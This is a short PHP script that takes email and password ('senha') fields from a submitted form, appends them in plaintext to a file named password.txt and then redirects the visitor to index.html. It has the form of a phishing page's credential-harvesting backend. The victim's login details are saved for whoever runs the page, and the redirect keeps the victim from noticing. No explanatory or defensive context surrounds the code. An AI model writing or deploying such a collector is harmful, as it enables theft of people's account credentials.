<?php
$file = fopen("password.txt","a");
$email = $_POST["email"];
$senha = $_POST["senha"];
fwrite($file, $email ."\n");
fwrite($file, $senha ."\n");
fclose($file);
header("location: index.html");
?>